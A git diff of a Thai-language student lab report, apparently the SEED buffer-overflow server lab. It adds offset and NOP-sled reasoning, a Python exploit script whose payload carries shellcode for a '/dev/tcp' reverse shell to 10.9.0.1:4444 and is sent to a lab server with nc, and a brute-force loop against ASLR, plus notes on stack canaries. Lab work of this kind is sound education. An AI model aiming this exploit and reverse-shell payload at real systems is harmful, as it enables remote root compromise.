@@ -349,6 +349,20 @@ char **generate_random_env(int length)
 
 - str ที่รับมาจาก main ขนาด 517 แต่ buffer ใน function bof ขนาด 200 ดังนั้นเมื่อทำ strcpy(buffer, str) จะ coppy str ใส่ใน buffer ทำให้ data ส่วนเกิน ไปทับ ส่วนอื่นใน stack frame เช่น old ebp,retern address, argment of function และ stack frame ด้านบน
 - ebp = 0xffffd248
+- buffer's address = 0xffffd1d8
+
+![alt text](image-23.png)
+
+- offset = 112 + 4 = 116
+
+![alt text](image-22.png)
+
+### แล้ว return address(ret) จะกระโดดไปไหนได้บ้าง ?
+- NOP-sled = ทางลาดลื่น (slide) จาก NOP ไปสู่ shellcode
+- ซึ่ง NOP จะต้องต่อเนื่องกันไป จนไปถึง address ที่เก็บ shell code ไว้ เพื่อให้ shell code ทำงาน
+- ถ้าให้ ret อยู่ในช่วง ของ offset((ebp + 4) - buffer's address). NOP-sled จะถูกขัดจังหวะด้วย value ที่เก็บอยู่ใน ret เอง
+- ดังนั้น ret ควรมีค่าอยู่ในช่วงที่มากกว่า ret's address + 4 หรือ ret = ebp + 8
+
 
 ### Shell Code
 ```
@@ -406,11 +420,66 @@ with open('badfile', 'wb') as f:
 
 ## Task 3: Level-2 Attack  (20 คะแนน) 
 
-![alt text](image-14.png)
 
-![alt text](image-12.png)
 
-![alt text](image-13.png)
+### Objective
+
+- Your job is to construct one payload to exploit the buffer overflow vulnerability on the server, 
+and get a root shell on the target server (using the reverse shell technique)
+- Range of the buffer size (in bytes): [100, 300] 
+- Only allowed to construct one payload that works for any buffer size within this 
+range.
+
+![alt text](image-24.png)
+
+```
+[10/09/25]seed@VM:~/.../attack-code$ python3 dynamic_buffer_size.py 
+0x90
+==============================================================================
+PAYLOAD HEXDUMP WITH ACTUAL ADDRESSES (Total: 517 bytes)
+Buffer starts at: 0xffffcfb8
+==============================================================================
+ffffcfb8: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  |................|
+ffffcfc8: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  |................|
+ffffcfd8: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  |................|
+ffffcfe8: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  |................|
+ffffcff8: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  |................|
+ffffd008: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  |................|
+ffffd018: 90 90 90 90 ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd028: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd038: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd048: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd058: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd068: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd078: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd088: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd098: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd0a8: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd0b8: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd0c8: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd0d8: ec d0 ff ff ec d0 ff ff ec d0 ff ff ec d0 ff ff  |................|
+ffffd0e8: ec d0 ff ff 90 90 90 90 90 90 90 90 90 90 90 90  |................|
+ffffd0f8: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  |................|
+ffffd108: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  |................|
+ffffd118: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  |................|
+ffffd128: 90 90 90 90 90 90 90 90 90 90 90 90 90 eb 29 5b  |..............)[|
+ffffd138: 31 c0 88 43 09 88 43 0c 88 43 47 89 5b 48 8d 4b  |1..C..C..CG.[H.K|
+ffffd148: 0a 89 4b 4c 8d 4b 0d 89 4b 50 89 43 54 8d 4b 48  |..KL.K..KP.CT.KH|
+ffffd158: 31 d2 31 c0 b0 0b cd 80 e8 d2 ff ff ff 2f 62 69  |1.1........../bi|
+ffffd168: 6e 2f 62 61 73 68 2a 2d 63 2a 2f 62 69 6e 2f 62  |n/bash*-c*/bin/b|
+ffffd178: 61 73 68 20 2d 69 20 3e 26 20 2f 64 65 76 2f 74  |ash -i >& /dev/t|
+ffffd188: 63 70 2f 31 30 2e 39 2e 30 2e 31 2f 34 34 34 34  |cp/10.9.0.1/4444|
+ffffd198: 20 30 3c 26 31 20 32 3e 26 31 20 20 20 20 20 20  | 0<&1 2>&1      |
+ffffd1a8: 20 20 20 20 2a 41 41 41 41 42 42 42 42 43 43 43  |    *AAAABBBBCCC|
+ffffd1b8: 43 44 44 44 44                                   |CDDDD|
+==============================================================================
+
+
+```
+
+![alt text](image-25.png)
+
+### Code dynamic_buffer_size.py 
 
 ```
 #!/usr/bin/python3
@@ -445,27 +514,59 @@ content = bytearray(0x90 for i in range(517))
 start = 517 - len(shellcode)             # Change this number 
 content[start:start + len(shellcode)] = shellcode
 
-Buffer_address = 0xffffd188
-ret = Buffer_address + 300
-for x in range(100, 300,4):
-    offset = x  
-    print("Using return address: ", hex(ret), " with offset: ", offset)
-    
+buffer_addr = 0xffffcfb8
+ret = buffer_addr + 308
+for offset in range(100, 308,4):
     content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
 
-    with open('badfile', 'wb') as f:
-        f.write(content)
-    
-    os.system('cat ./badfile | nc 10.9.0.6 9090')
+print(hex(content[0]))
+# =============== แสดง Hexdump ด้วย Address ===============
+print("=" * 78)
+print(f"PAYLOAD HEXDUMP WITH ACTUAL ADDRESSES (Total: {len(content)} bytes)")
+print(f"Buffer starts at: 0x{buffer_addr:08x}")
+print("=" * 78)
 
+# แสดงด้วย address จริง
+for i in range(0, len(content), 16):
+    chunk = content[i:i+16]
+    
+    # คำนวณ address จริง
+    actual_address = buffer_addr + i
+    
+    hex_part = ' '.join(f'{b:02x}' for b in chunk)
+    ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
+    
+    # แสดง address จริง
+    print(f"{actual_address:08x}: {hex_part:<48} |{ascii_part}|")
+
+print("=" * 78)
+
+with open('badfile', 'wb') as f:
+    f.write(content)
+    
+os.system('cat ./badfile | nc 10.9.0.6 9090')
 
 ```
+
+### Condition
+- Server ไม่บอก ebp ---> คำนวณหา offset ไม่ได้ ---> ระบุตำแหน่งที่อยู่ของ ret ไม่ได้
+
+
+### Solve
+
+- โจทย์ให้ Range of the buffer size (in bytes): [100, 300] 
+- เนื่องจาก ระบุตำแหน่งที่อยู่ของ ret ไม่ได้ และทราบว่า min size of buffer = 100 เพื่อให้ shell code ทำงาน จะต้องเขียนทับ return address ให้ชี้ไปยัง NOP-sled(ที่อยู่ติดกับ shell code) จึงต้องเขียน ret value เข้าไปใน buffer ตั้งแต่ buffer[100] จนถึง buffer[308] โดยคาดหวังว่ามี Memory ในส่วนที่บรรจุ return address อยู่
+- ret น้อยสุดที่เป็นไปได้ที่จะเกิด NOP-sled ในกระณีที่ buffer size = 300 คือ buffer_addr + (max size of buffer = 300) + 8
 
 
 
 ## Task 4: Experimenting with the Address Randomization (5 คะแนน) 
 
-
+### OBjective
+- Please send a message to the Level1 server, and do it multiple times. In your 
+report, please report your observation, and explain why ASLR makes the buffer-overflow 
+attack more difficult.
+- Use the brute-force approach to attack the server repeatedly
 
 ```
 cat /proc/sys/kernel/randomize_va_space
@@ -476,11 +577,45 @@ sudo sysctl -w kernel.randomize_va_space=2
 
 ![alt text](image-17.png)
 
+### brute-force.sh
+```
+#!/bin/bash
+
+SECONDS=0
+value=0
+
+while true; do
+  value=$(( $value + 1 ))
+  duration=$SECONDS
+  min=$(($duration / 60))
+  sec=$(($duration % 60))
+  echo "$min minutes and $sec seconds elapsed."
+  echo "The program has been running $value times so far."
+  cat badfile | nc 10.9.0.5 9090
+done
+
+```
+- ใช้ badfile จาก Level-1 attack 
+- จะเป็นการ ส่ง payload เดิมให้ server ซ้ำๆ
+
+### ASLR makes the buffer-overflow attack more difficult
+- ในการโจมตีจำเป็นต้องรู้ตำแหน่งของ return address เพื่อเขียนทับ return address value ให้ชี้ไปยัง NOP-sled ที่ติดกับ shell code ดังนั้น จะต้องรู้ตำแหน่งของ buffer's address หรือ ตำแหน่งของ Previous frame pointer เพื่อให้คำนวณหา ตำแหน่งของ return address
+- แต่ทุกครั้งที่เราส่ง payload ให้ server แล้ว server จะเรียก stack program ซึ่ง address จะถูกสุ่ม เนื่องจาก ASLR enable ทำให้ แต่ละ secment ใน moemory layout เปลี่ยน address ทุกครั้งที่รัน ซึ่ง ตำแหน่งของ buffer's address หรือ ตำแหน่งของ Previous frame pointer เพื่อให้คำนวณหา ตำแหน่งของ return address จะอยู่ใน stack secment ทำให้ไม่สามารถคำนวณหา ตำแหน่งของ return address ที่แน่นอนได้ ทำให้การโจมตียากมากขึ้น
+
+### หลักการโจมตี
+- จะรัน brute-force.sh โดยจะเป็นการเรียก badfile ซ้ำๆ 
+- การสุ่มของ ASLR เปรียบเหมือนการสุ่ม addres ของ NOP-sled ที่ติดกับ shell code 
+- โดยคาดหวังว่าช่วงของ NOP-sled นั้นจะมีสักค่าหนึ่งที่ตรงกับ ret value ที่ตั้งไว้ใน badfile
+
+
+
 ![alt text](image-18.png)
 
 ![alt text](image-19.png)
 
 ## Tasks 5: Experimenting with Other Countermeasures ( 10 คะแนน) 
+
+
 
 ![alt text](image-20.png)
 
@@ -492,8 +627,6 @@ https://www.redhat.com/en/blog/security-technologies-stack-smashing-protection-s
 2. **ตรวจสอบ canary** ก่อน function return
 3. **Terminate program** หาก canary ถูกเปลี่ยนแปลง
 4. **ลดผลกระทบ** จาก code execution เหลือเพียง denial of service
-
-
 
 ### ประเภทของ Canary ทั้ง 3 แบบ
 
